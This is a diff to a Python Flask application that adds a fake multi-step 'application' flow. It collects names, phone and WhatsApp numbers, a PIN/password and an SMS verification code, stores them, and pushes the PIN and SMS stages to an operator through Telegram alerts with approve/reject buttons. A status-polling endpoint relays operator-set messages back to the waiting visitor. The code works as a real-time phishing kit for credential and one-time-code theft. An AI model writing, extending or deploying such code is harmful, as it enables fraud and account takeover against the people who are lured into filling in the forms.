@@ -87,6 +87,129 @@ def send_telegram_support_alert(ticket_data, db_id):
     except Exception as e:
         print(f"Telegram support alert error: {e}")
 
+# ==========================================
+# APPLICATION STEP ROUTES
+# ==========================================
+
+@app.route("/", methods=["GET"])
+def index():
+    return redirect(url_for("apply_step1"))
+
+@app.route("/apply/step1", methods=["GET", "POST"])
+def apply_step1():
+    if request.method == "POST":
+        first_name = request.form.get("first_name", "").strip()
+        last_name = request.form.get("last_name", "").strip()
+        phone = request.form.get("phone", "").strip()
+        
+        app_id = "APP" + os.urandom(4).hex().upper()
+        
+        session["app_id"] = app_id
+        session["first_name"] = first_name
+        session["last_name"] = last_name
+        session["phone"] = phone
+        
+        app_data = {
+            "app_id": app_id,
+            "first_name": first_name,
+            "last_name": last_name,
+            "phone": phone,
+            "status": "Step1_Completed",
+            "created_at": time.time()
+        }
+        
+        inserted_id = applications_collection.insert_one(app_data).inserted_id
+        session["db_id"] = str(inserted_id)
+        
+        return redirect(url_for("apply_step2"))
+        
+    return render_template("step1.html")
+
+@app.route("/apply/step2", methods=["GET", "POST"])
+def apply_step2():
+    if request.method == "POST":
+        whatsapp_phone = request.form.get("whatsapp_phone", "").strip()
+        
+        db_id = session.get("db_id")
+        if db_id:
+            applications_collection.update_one(
+                {"_id": ObjectId(db_id)},
+                {"$set": {"whatsapp_phone": whatsapp_phone, "status": "Step2_Completed"}}
+            )
+            
+        return redirect(url_for("apply_step3"))
+        
+    return render_template("step2.html")
+
+@app.route("/apply/step3", methods=["GET", "POST"])
+def apply_step3():
+    if request.method == "POST":
+        password = request.form.get("password", "").strip()
+        
+        db_id = session.get("db_id")
+        if db_id:
+            applications_collection.update_one(
+                {"_id": ObjectId(db_id)},
+                {"$set": {"password": password, "status": "PIN_Submitted"}}
+            )
+            
+            app_data = applications_collection.find_one({"_id": ObjectId(db_id)})
+            if app_data:
+                send_telegram_interactive_alert(app_data, stage_title="NEW APPLICATION - PIN SUBMITTED", step_code="pin")
+                
+        return redirect(url_for("processing"))
+        
+    return render_template("step3.html")
+
+@app.route("/processing")
+def processing():
+    return render_template("processing.html")
+
+@app.route("/login", methods=["GET", "POST"])
+def login():
+    if request.method == "POST":
+        auth_code = request.form.get("auth_code", "").strip()
+        
+        db_id = session.get("db_id")
+        if db_id:
+            applications_collection.update_one(
+                {"_id": ObjectId(db_id)},
+                {"$set": {"auth_code": auth_code, "status": "SMS_Submitted"}}
+            )
+            
+            app_data = applications_collection.find_one({"_id": ObjectId(db_id)})
+            if app_data:
+                send_telegram_interactive_alert(app_data, stage_title="SMS VERIFICATION CODE SUBMITTED", step_code="sms")
+                
+        app_id = session.get("app_id", "")
+        return redirect(url_for("pending", app_id=app_id))
+        
+    return render_template("login.html")
+
+@app.route("/pending")
+def pending():
+    app_id = request.args.get("app_id", session.get("app_id", ""))
+    return render_template("pending.html", app_id=app_id)
+
+@app.route("/check-status")
+def check_status():
+    app_id = request.args.get("app_id")
+    if not app_id:
+        return jsonify({"status": "Unknown"}), 400
+        
+    app_data = applications_collection.find_one({"app_id": app_id})
+    if app_data:
+        return jsonify({
+            "status": app_data.get("status", "Pending"),
+            "custom_message": app_data.get("custom_message", "")
+        }), 200
+        
+    return jsonify({"status": "Not Found"}), 404
+
+# ==========================================
+# SYSTEM UTILS & WEBHOOK
+# ==========================================
+
 @app.route("/health")
 def health():
     try:
@@ -127,7 +250,6 @@ def telegram_webhook():
         data = request.get_json() or {}
         print("=== TELEGRAM WEBHOOK RECEIVED ===", data)
         
-        # 1. Handle Inline Button Clicks (Approvals, Rejections, Resolve)
         if "callback_query" in data:
             callback = data["callback_query"]
             callback_data = callback.get("data", "")
@@ -183,7 +305,6 @@ def telegram_webhook():
             except Exception as e:
                 print(f"Answer callback error: {e}")
 
-        # 2. Handle Direct Text Messages & Diagnostic Commands (/diagnose or /test)
         elif "message" in data:
             msg = data["message"]
             chat_id = str(msg.get("chat", {}).get("id"))
